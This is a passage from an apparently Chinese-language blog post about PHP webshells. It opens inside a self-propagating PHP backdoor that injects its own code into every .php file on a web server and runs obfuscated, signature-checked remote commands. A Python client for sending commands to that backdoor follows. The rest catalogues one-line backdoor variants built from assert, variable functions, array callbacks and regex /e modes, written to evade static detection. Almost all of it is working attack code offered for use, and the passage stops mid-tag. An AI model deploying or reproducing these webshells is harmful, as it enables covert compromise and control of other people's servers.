class="string">&#x27;/&#x27;</span> . <span class="variable">$fi</span>;</span><br><span class="line">                    <span class="keyword">if</span> (strpos(<span class="variable">$file_Path</span>, <span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line">                        <span class="comment">//筛选当前目录.php后缀</span></span><br><span class="line">                        <span class="variable">$le</span> = Url_Check();</span><br><span class="line">                        <span class="variable">$file_Path</span> = str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$file_Path</span>);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;&lt;iframe id=&quot;check_url&quot;&gt;&#x27;</span> . <span class="variable">$le</span> . <span class="string">&#x27;&#x27;</span> . str_replace(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_Path</span>) . <span class="string">&#x27;&lt;/iframe&gt;&#x27;</span>;</span><br><span class="line">                        <span class="variable">$ftarget</span> = file(<span class="variable">$file_Path</span>);</span><br><span class="line">                        <span class="keyword">if</span> (!strpos(<span class="variable">$ftarget</span>[<span class="number">0</span>], <span class="string">&#x27;AWD_Light_Check&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="comment">//检查头部是否传播</span></span><br><span class="line">                            <span class="variable">$scode</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$localtext</span> = file(<span class="keyword">__FILE__</span>);</span><br><span class="line">                            <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$Serv_Num</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">                                <span class="variable">$scode</span> .= <span class="variable">$localtext</span>[<span class="variable">$i</span>];</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$code_check</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$file_check</span> = fopen(<span class="variable">$file_Path</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">                            <span class="comment">//复制要传播的文件代码，进行重写</span></span><br><span class="line">                            <span class="keyword">while</span> (!feof(<span class="variable">$file_check</span>)) &#123;</span><br><span class="line">                                <span class="variable">$code_check</span> .= fgets(<span class="variable">$file_check</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            fclose(<span class="variable">$file_check</span>);</span><br><span class="line">                            <span class="variable">$webpage</span> = fopen(<span class="variable">$file_Path</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            fwrite(<span class="variable">$webpage</span>, <span class="variable">$scode</span> . <span class="variable">$code_check</span>);</span><br><span class="line">                            fclose(<span class="variable">$webpage</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                closedir(<span class="variable">$dh</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//定义特征才启动传播模式，特征值为_</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$host</span> = Url_Check();</span><br><span class="line">        file_check(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>]);</span><br><span class="line">        <span class="comment">//全局扫描</span></span><br><span class="line">        write_conf();</span><br><span class="line">        <span class="comment">//写入单文件</span></span><br><span class="line">        vul_tran();</span><br><span class="line">        <span class="comment">//感染当前目录</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;salt&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">#客户端数字签名校验</span></span><br><span class="line">        <span class="variable">$Check_key</span> = <span class="string">&#x27;9c82746189f3d1815f1e6bfe259dac29&#x27;</span>;</span><br><span class="line">        <span class="variable">$Check_api</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;check&#x27;</span>];</span><br><span class="line">        <span class="variable">$timestamp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>];</span><br><span class="line">        <span class="variable">$salt</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;salt&#x27;</span>];</span><br><span class="line">        <span class="variable">$csign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line">        <span class="variable">$sign</span> = md5(<span class="variable">$Check_api</span> . <span class="variable">$Check_key</span> . <span class="variable">$timestamp</span> . <span class="variable">$salt</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$sign</span> === <span class="variable">$csign</span>) &#123;</span><br><span class="line">            <span class="variable">$nomal_test</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$Check_api</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="variable">$nomal_test</span> .= chr(ord(<span class="variable">$Check_api</span>[<span class="variable">$i</span>]) ^ <span class="variable">$i</span> % <span class="variable">$salt</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$nomal_test</span> = base64_decode(<span class="variable">$nomal_test</span>);</span><br><span class="line">            <span class="variable">$nowtime</span> = time();</span><br><span class="line">            <span class="keyword">if</span> (abs(<span class="variable">$nowtime</span> - <span class="variable">$timestamp</span>) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="variable">$enc</span> = base64_encode(rawurlencode(`&#123;<span class="variable">$nomal_test</span>&#125;`));</span><br><span class="line">                <span class="comment">//解密并执行命令在加密返回</span></span><br><span class="line">                <span class="variable">$pieces</span> = explode(<span class="string">&quot;i&quot;</span>, <span class="variable">$enc</span>);</span><br><span class="line">                <span class="variable">$final</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$pieces</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="variable">$final</span> .= <span class="variable">$val</span> . <span class="string">&quot;cAFAcABAAswTA2GE2c&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$final</span> = str_replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;:kcehc_revres&quot;</span>, <span class="variable">$final</span>);</span><br><span class="line">                <span class="keyword">echo</span> strrev(substr(<span class="variable">$final</span>, <span class="number">0</span>, strlen(<span class="variable">$final</span>) - <span class="number">18</span>));</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                header(<span class="string">&#x27;HTTP/1.1 500 Internal Server Error&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            header(<span class="string">&#x27;HTTP/1.1 500 Internal Server Error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        header(<span class="string">&#x27;HTTP/1.1 500 Internal Server Error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e2</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">webshell_url = <span class="string">&#x27;http://192.168.75.134/wuhen.php&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;ifconfig&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSerTime</span>(<span class="params">url</span>):</span></span><br><span class="line">    ser_time_format = <span class="string">&#x27;%a, %d %b %Y %H:%M:%S GMT&#x27;</span></span><br><span class="line">    r = requests.get(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.headers[<span class="string">&#x27;Date&#x27;</span>]:</span><br><span class="line">        stimestrp = time.strptime(r.headers[<span class="string">&#x27;Date&#x27;</span>], ser_time_format)</span><br><span class="line">        stime = time.mktime(stimestrp) + <span class="number">60</span> * <span class="number">60</span> * <span class="number">8</span>  <span class="comment"># GMT + 8 时区</span></span><br><span class="line">        timeskew = <span class="built_in">int</span>(time.time()) - <span class="built_in">int</span>(stime)</span><br><span class="line">        <span class="keyword">return</span> timeskew</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">string, salt, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    estring = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    b64string = base64.b64encode(string.encode(encoding)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> n, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(b64string):</span><br><span class="line">        estring += <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ n % salt)</span><br><span class="line">    <span class="keyword">return</span> estring</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">estring, salt, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    data = estring[::-<span class="number">1</span>].replace(<span class="string">&#x27;cAFAcABAAswTA2GE2c&#x27;</span>, <span class="string">&#x27;i&#x27;</span>).replace(<span class="string">&#x27;:kcehc_revres&#x27;</span>, <span class="string">&#x27;=&#x27;</span>).encode(</span><br><span class="line">        <span class="string">&#x27;unicode_escape&#x27;</span>).decode(<span class="string">&quot;string_escape&quot;</span>)</span><br><span class="line">    string = unquote(base64.urlsafe_b64decode(data))</span><br><span class="line">    string = unicode(string, <span class="string">&quot;gb2312&quot;</span>).encode(<span class="string">&quot;utf8&quot;</span>)  <span class="comment"># windows有中文乱码去掉这个注释，linux去掉这行，不然会报错</span></span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">excmd</span>(<span class="params">url, passwd, cmd, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        timeskew = getSerTime(<span class="string">&#x27;/&#x27;</span>.join(url.split(<span class="string">&#x27;/&#x27;</span>)[:-<span class="number">1</span>]))</span><br><span class="line">        <span class="comment"># 校对服务器时间，防止时间差造成API校验失败</span></span><br><span class="line">        nowtime = <span class="built_in">int</span>(time.time())</span><br><span class="line">        <span class="keyword">if</span> timeskew == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;检查服务器时间出错，请手动确认服务器时间！&#x27;</span>)</span><br><span class="line">            <span class="comment"># 手动获取服务器时间戳，并保存到servtime变量中，int类型</span></span><br><span class="line">            <span class="comment"># Linux下获取方法：date +%s</span></span><br><span class="line">            servtime = <span class="number">1540891350</span></span><br><span class="line">            nowtime = servtime</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nowtime -= timeskew</span><br><span class="line">        <span class="comment"># 开始发起请求</span></span><br><span class="line">        passwd = md5(passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        salt = <span class="built_in">int</span>(random() * <span class="number">100</span>)</span><br><span class="line">        ecmd = encrypt(cmd, salt)</span><br><span class="line">        sign_tmp = ecmd + passwd + <span class="built_in">str</span>(nowtime) + <span class="built_in">str</span>(salt)</span><br><span class="line">        sign = md5(sign_tmp.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        parameters = &#123;</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: nowtime,</span><br><span class="line">            <span class="string">&#x27;check&#x27;</span>: ecmd,</span><br><span class="line">            <span class="string">&#x27;salt&#x27;</span>: salt,</span><br><span class="line">            <span class="string">&#x27;sign&#x27;</span>: sign</span><br><span class="line">        &#125;</span><br><span class="line">        head = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>&#125;</span><br><span class="line">        r = requests.get(url, params=parameters, headers=head, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="comment"># r = requests.post(url, data=parameters, headers=head, proxies=&#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;),</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;0:&#x27;</span> <span class="keyword">in</span> r.text: <span class="built_in">print</span></span><br><span class="line">        <span class="string">&#x27;执行成功：&#x27;</span>,</span><br><span class="line">        res = decrypt(r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&#x27;0:&#x27;</span>, <span class="string">&#x27;&#x27;</span>), salt, encoding)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># print(&#x27;参数配置错误，连接异常err:%s&#x27;%str(e))</span></span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    r = excmd(webshell_url, passwd, cmd)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="动态特性类"><a href="#动态特性类" class="headerlink" title="动态特性类"></a>动态特性类</h1><h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>允许我们动态地改变一个变量的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27;c&#x27;</span>;</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;c&#x27;</span>;</span><br></pre></td></tr></table></figure><p>双刀大法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><p> 如果一个变量名后有圆括号，PHP 将寻找与<strong>变量的值同名的函数</strong>，并且尝试执行它利用可变函数，我们可以将函数名也作为参数进行传递，避免敏感关键字被静态检测识别出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211201140328774.png" alt="image-20211201140328774"></p><blockquote><p>一般都是使用<code>assert</code>，因为<code>eval</code>不能被可变函数调用</p></blockquote><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>回调函数是指调用函数的时候，将另一个函数作为参数传递到调用的函数中，而不是传递一个普通的变量作为参数。使用回调函数是为了可以将一段自己定义的功能传到函数内部使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @call_user_func(<span class="string">&#x27;assert&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>call_user_func_array</code>函数，和<code>call_user_func</code>类似，只是第二个参数可以传入参数列表组成的数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @call_user_func_array(<span class="string">&#x27;assert&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>])); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在php中回调函数很多，含有回调（callable类型）参数的函数，其实都有做“回调后门”的潜力。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_filter(<span class="variable">$arr</span>, base64_decode(<span class="variable">$e</span>));</span><br></pre></td></tr></table></figure><blockquote><p>array_filter函数是将数组中所有元素遍历并用指定函数处理过滤用的</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211201162038405.png" alt="image-20211201162038405"></p><h3 id="php5-4-8-assert支持两个参数"><a href="#php5-4-8-assert支持两个参数" class="headerlink" title="php5.4.8+ assert支持两个参数"></a>php5.4.8+ assert支持两个参数</h3><h4 id="uasort"><a href="#uasort" class="headerlink" title="uasort"></a>uasort</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">uasort(<span class="variable">$arr</span>, base64_decode(<span class="variable">$e</span>));</span><br></pre></td></tr></table></figure><blockquote><p>后门在php5.3时会报错，提示assert只能有一个参数</p></blockquote><h4 id="uksort"><a href="#uksort" class="headerlink" title="uksort"></a>uksort</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>);</span><br><span class="line">uksort(<span class="variable">$arr</span>, <span class="variable">$e</span>);</span><br></pre></td></tr></table></figure><p>面向对象的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// way 0</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$arr</span>-&gt;uasort(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// way 1</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>));</span><br><span class="line"><span class="variable">$arr</span>-&gt;uksort(<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="array-reduce-array-map"><a href="#array-reduce-array-map" class="headerlink" title="array_reduce/array_map"></a>array_reduce/array_map</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_reduce(<span class="variable">$arr</span>, <span class="variable">$e</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h4 id="array-udiff"><a href="#array-udiff" class="headerlink" title="array_udiff"></a>array_udiff</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="variable">$arr2</span> = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_udiff(<span class="variable">$arr</span>, <span class="variable">$arr2</span>, <span class="variable">$e</span>);</span><br></pre></td></tr></table></figure><h3 id="三个参数的回调"><a href="#三个参数的回调" class="headerlink" title="三个参数的回调"></a>三个参数的回调</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk(<span class="variable">$arr</span>, <span class="variable">$e</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>上面说过</p><p>一个参数：<code>assert</code><br>两个参数：<code>assert （php5.4.8+）</code><br>三个参数：<code>preg_replace /e</code>模式</p><p><code>e=preg_replace</code> <code>/e</code>模式, 只限用于preg_replace()函数,把替换的字符串中的内容当成一个PHP表达式。</p><p>array_walk_recursive同</p></blockquote><h2 id="正则e模式"><a href="#正则e模式" class="headerlink" title="正则e模式"></a>正则e模式</h2><h3 id="mb-ereg-replace"><a href="#mb-ereg-replace" class="headerlink" title="mb_ereg_replace"></a>mb_ereg_replace</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace(<span class="string">&#x27;.*&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="preg-filter"><a href="#preg-filter" class="headerlink" title="preg_filter"></a>preg_filter</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_filter(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="其他回调"><a href="#其他回调" class="headerlink" title="其他回调"></a>其他回调</h2><h3 id="register-shutdown-function"><a href="#register-shutdown-function" class="headerlink" title="register_shutdown_function"></a>register_shutdown_function</h3><figure class="highlight 